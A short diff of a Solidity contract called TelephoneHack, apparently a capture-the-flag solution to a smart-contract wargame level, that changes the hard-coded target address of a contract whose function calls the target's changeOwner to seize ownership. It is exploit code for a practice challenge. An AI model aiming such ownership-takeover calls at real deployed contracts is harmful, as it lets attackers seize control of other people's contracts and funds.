@@ -10,7 +10,7 @@ contract TelephoneHack {
     }
 
     Telephone public telephone =
-        Telephone(0xb84b4e75189f027dA8A586de4deBbEd1D87a37FD);
+        Telephone(0xD956969E96304e7B0f98F9FA9BcbF85dF52D18D5);
 
     function changeTelephoneOwner(address _address) public {
         telephone.changeOwner(_address);
